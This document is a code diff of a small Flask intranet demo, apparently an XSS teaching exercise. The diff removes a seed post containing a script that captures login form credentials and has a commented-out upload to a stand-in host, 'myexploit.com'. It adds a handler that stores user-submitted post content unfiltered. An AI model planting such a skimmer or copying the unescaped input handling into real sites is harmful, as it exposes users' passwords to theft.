@@ -15,8 +15,8 @@ db = SQLAlchemy(app)
 
 class Post(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    title = db.Column(db.String(80), unique=True)
-    author = db.Column(db.String(80), unique=True)
+    title = db.Column(db.String(80))
+    author = db.Column(db.String(80))
     content = db.Column(db.String(1024))
 
     def __init__(self, title, author, content):
@@ -30,30 +30,24 @@ class Post(db.Model):
 post_list = [
     Post('New Game of Clones', 'bigboss', 
         'Anyone caught stealing the latest Game of Clones movie will be fired <strong>immediately</strong>! This is your first and only warning.'),
-    Post("Hack", 'hero',
-        """You got got!
-        <script type="text/javascript">
-            // something like:
-            $(function() {
-                $("#submit").click(function() {
-                   data = {
-                      username: $("#username").val(),
-                      password: $("#password").val()
-                   };
-                   alert("Just posted username: " + data.username + " password: " + data.password);
-                   //$.post("http://myexploit.com/credentials", data, function(posted_data , status){
-                        
-                   //});
-                });
-            });
-        </script>
-        """),
 ]
 
-@app.route('/')
+@app.route('/', methods=['GET', 'POST'])
 def home():
+    error = None
+    try:
+        if request.method == 'POST':
+            post = Post(
+                request.form['title'],
+                'hero',
+                request.form['content']
+            )
+            db.session.add(post)
+            db.session.commit()    
+    except Exception as e:
+        error = e.message
     posts = Post.query.all()
-    return render_template('intranet.html', posts=posts)
+    return render_template('intranet.html', posts=posts, error=error)
 
 def setup_logging(loglevel):
     logformat = "%(asctime)s: %(message)s"
